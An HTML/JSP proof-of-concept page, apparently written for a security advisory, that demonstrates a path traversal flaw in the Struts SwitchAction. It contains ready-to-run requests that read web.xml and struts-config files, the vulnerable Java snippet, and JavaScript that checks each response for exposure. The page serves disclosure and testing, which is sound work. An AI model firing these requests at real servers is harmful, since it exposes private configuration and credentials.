<%@ page contentType="text/html;charset=UTF-8" %>
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>SwitchAction Path Traversal Demo (C-1)</title>
  <style>
    body { font-family: monospace; max-width: 900px; margin: 2em auto; padding: 0 1em; }
    h1   { font-size: 1.4em; }
    h2   { font-size: 1.1em; margin-top: 2em; border-bottom: 1px solid #ccc; padding-bottom: 0.3em; }
    p    { line-height: 1.6; }
    code { background: #f5f5f5; padding: 0.15em 0.4em; border-radius: 2px; }
    pre  { background: #263238; color: #eeffff; padding: 1em; overflow-x: auto; border-radius: 4px; white-space: pre-wrap; word-break: break-all; }

    .case       { border: 1px solid #ccc; border-radius: 4px; padding: 1em; margin: 1em 0; }
    .case.safe  { border-color: #4caf50; background: #f9fbe7; }
    .case.vuln  { border-color: #f44336; background: #fff8f8; }

    .case-label { font-weight: bold; font-size: 0.85em; letter-spacing: 0.05em; }
    .case.safe  .case-label { color: #2e7d32; }
    .case.vuln  .case-label { color: #c62828; }

    button {
      margin-top: 0.6em; padding: 0.4em 1em;
      border: none; border-radius: 3px; cursor: pointer;
      font-family: monospace; font-size: 0.9em;
    }
    button.run-safe { background: #4caf50; color: #fff; }
    button.run-vuln { background: #f44336; color: #fff; }
    button:disabled { opacity: 0.5; cursor: default; }

    .result { margin-top: 0.8em; display: none; }
    .verdict {
      display: inline-block; padding: 0.3em 0.8em;
      border-radius: 3px; font-weight: bold; font-size: 0.9em; margin-bottom: 0.5em;
    }
    .verdict.ok   { background: #4caf50; color: #fff; }
    .verdict.fail { background: #f44336; color: #fff; }

    .response-body { max-height: 300px; overflow-y: auto; font-size: 0.82em; }
    .status-line   { font-size: 0.85em; color: #555; margin-bottom: 0.4em; }
  </style>
</head>
<body>

<h1>SwitchAction Path Traversal Demo (C-1)</h1>

<p>
  <code>SwitchAction</code> reads the <code>page</code> request parameter and passes it
  <strong>without any validation</strong> to <code>new ActionForward(page)</code>.
  The servlet container then dispatches it via <code>RequestDispatcher.forward()</code>,
  allowing an attacker to read arbitrary server-side resources.
</p>
<p>
  Click <strong>Run</strong> on each case to send a <code>fetch()</code> request from
  the browser, inspect the response body, and determine whether the vulnerability is
  <strong>exploitable</strong> or <strong>not exploitable</strong>.
</p>

<!-- ============================================================ -->
<h2>Safe cases (legitimate usage)</h2>
<!-- ============================================================ -->

<div class="case safe" id="case-safe1">
  <div class="case-label">SAFE — switch to module1</div>
  <p>
    <code>prefix=/module1</code> and <code>page=/hello.do</code>.
    <code>SwitchAction</code> selects module1 and forwards to its <code>/hello.do</code>
    mapping, which renders a normal HTML page. This is the intended usage.
  </p>
  <code>GET switch.do?prefix=/module1&amp;page=/hello.do</code><br>
  <button class="run-safe" onclick="runCase(this, 'switch.do?prefix=/module1&page=/hello.do', checkSafe)">Run</button>
  <div class="result">
    <div class="verdict"></div>
    <div class="status-line"></div>
    <pre class="response-body"></pre>
  </div>
</div>

<div class="case safe" id="case-safe2">
  <div class="case-label">SAFE — switch to module2</div>
  <p>
    <code>prefix=/module2</code> and <code>page=/hello.do</code>.
    Switches to module2 and renders its hello page.
  </p>
  <code>GET switch.do?prefix=/module2&amp;page=/hello.do</code><br>
  <button class="run-safe" onclick="runCase(this, 'switch.do?prefix=/module2&page=/hello.do', checkSafe)">Run</button>
  <div class="result">
    <div class="verdict"></div>
    <div class="status-line"></div>
    <pre class="response-body"></pre>
  </div>
</div>

<!-- ============================================================ -->
<h2>Vulnerable cases (path traversal)</h2>
<!-- ============================================================ -->

<div class="case vuln" id="case-vuln1">
  <div class="case-label">VULN — read /WEB-INF/web.xml</div>
  <p>
    <code>page=/WEB-INF/web.xml</code> is passed to <code>SwitchAction</code>.
    Because there is no validation, the deployment descriptor is forwarded and its
    XML content is returned in the response body.
    Detection: response contains <code>&lt;web-app&gt;</code>.
  </p>
  <code>GET switch.do?prefix=&amp;page=/WEB-INF/web.xml</code><br>
  <button class="run-vuln" onclick="runCase(this, 'switch.do?prefix=&page=/WEB-INF/web.xml', checkWebXml)">Run</button>
  <div class="result">
    <div class="verdict"></div>
    <div class="status-line"></div>
    <pre class="response-body"></pre>
  </div>
</div>

<div class="case vuln" id="case-vuln2">
  <div class="case-label">VULN — read /WEB-INF/struts-config.xml</div>
  <p>
    Reads the Struts configuration file, exposing action mappings, form-bean types,
    plug-in settings, and potentially data-source credentials.
    Detection: response contains <code>&lt;struts-config&gt;</code>.
  </p>
  <code>GET switch.do?prefix=&amp;page=/WEB-INF/struts-config.xml</code><br>
  <button class="run-vuln" onclick="runCase(this, 'switch.do?prefix=&page=/WEB-INF/struts-config.xml', checkStrutsConfig)">Run</button>
  <div class="result">
    <div class="verdict"></div>
    <div class="status-line"></div>
    <pre class="response-body"></pre>
  </div>
</div>

<div class="case vuln" id="case-vuln3">
  <div class="case-label">VULN — read /WEB-INF/struts-config-module1.xml</div>
  <p>
    Reads the per-module Struts configuration, revealing internal routing details.
    Detection: response contains <code>&lt;struts-config&gt;</code>.
  </p>
  <code>GET switch.do?prefix=&amp;page=/WEB-INF/struts-config-module1.xml</code><br>
  <button class="run-vuln" onclick="runCase(this, 'switch.do?prefix=&page=/WEB-INF/struts-config-module1.xml', checkStrutsConfig)">Run</button>
  <div class="result">
    <div class="verdict"></div>
    <div class="status-line"></div>
    <pre class="response-body"></pre>
  </div>
</div>

<!-- ============================================================ -->
<h2>Vulnerable code</h2>
<!-- ============================================================ -->

<pre>
// SwitchAction.java
String page   = request.getParameter("page");   // attacker-controlled
String prefix = request.getParameter("prefix"); // checked against registered modules only

// prefix is validated — but page is never validated
return (new ActionForward(page));  // &lt;-- arbitrary path forwarded

// RequestProcessor ultimately calls:
//   getServletContext().getRequestDispatcher(page).forward(req, res);
</pre>

<hr>
<p><small>C-1 — SwitchAction path traversal / See: GitHub Security Advisory</small></p>

<script>
// -----------------------------------------------------------------------
// Check functions: receive (body, status), return { vulnerable, reason }
// -----------------------------------------------------------------------

function checkSafe(body, status) {
  if (status >= 200 && status < 400 && body.includes('Module')) {
    return { vulnerable: false, reason: 'Legitimate module page returned (expected behavior).' };
  }
  return { vulnerable: false, reason: 'Response received (status=' + status + ').' };
}

function checkWebXml(body, status) {
  if (body.includes('<web-app')) {
    return { vulnerable: true, reason: 'web.xml content exposed — <web-app> tag found in response.' };
  }
  if (status === 404 || status === 400) {
    return { vulnerable: false, reason: 'Container blocked the request (status=' + status + ').' };
  }
  return { vulnerable: false, reason: 'web.xml content not found in response (status=' + status + ').' };
}

function checkStrutsConfig(body, status) {
  if (body.includes('<struts-config')) {
    return { vulnerable: true, reason: 'struts-config.xml content exposed — <struts-config> tag found in response.' };
  }
  if (status === 404 || status === 400) {
    return { vulnerable: false, reason: 'Container blocked the request (status=' + status + ').' };
  }
  return { vulnerable: false, reason: 'Configuration file content not found in response (status=' + status + ').' };
}

// -----------------------------------------------------------------------
// Run fetch and display result
// -----------------------------------------------------------------------

async function runCase(btn, url, checkFn) {
  btn.disabled = true;
  btn.textContent = 'Running...';

  const caseDiv  = btn.closest('.case');
  const resultDiv = caseDiv.querySelector('.result');
  const verdictEl = caseDiv.querySelector('.verdict');
  const statusEl  = caseDiv.querySelector('.status-line');
  const bodyEl    = caseDiv.querySelector('.response-body');

  resultDiv.style.display = 'block';
  verdictEl.textContent = '...';
  verdictEl.className   = 'verdict';
  statusEl.textContent  = '';
  bodyEl.textContent    = '';

  let status = 0;
  let body   = '';

  try {
    const res = await fetch(url, { method: 'GET', credentials: 'same-origin' });
    status = res.status;
    body   = await res.text();
  } catch (e) {
    verdictEl.textContent = 'ERROR';
    verdictEl.className   = 'verdict fail';
    statusEl.textContent  = 'fetch failed: ' + e.message;
    btn.disabled = false;
    btn.textContent = 'Re-run';
    return;
  }

  const result = checkFn(body, status);

  verdictEl.textContent = result.vulnerable ? 'VULNERABLE' : 'NOT VULNERABLE';
  verdictEl.className   = 'verdict ' + (result.vulnerable ? 'fail' : 'ok');
  statusEl.textContent  = 'HTTP ' + status + ' — ' + result.reason;
  bodyEl.textContent    = body.trim().substring(0, 2000) + (body.length > 2000 ? '\n\n... (truncated)' : '');

  btn.disabled = false;
  btn.textContent = 'Re-run';
}
</script>

</body>
</html>
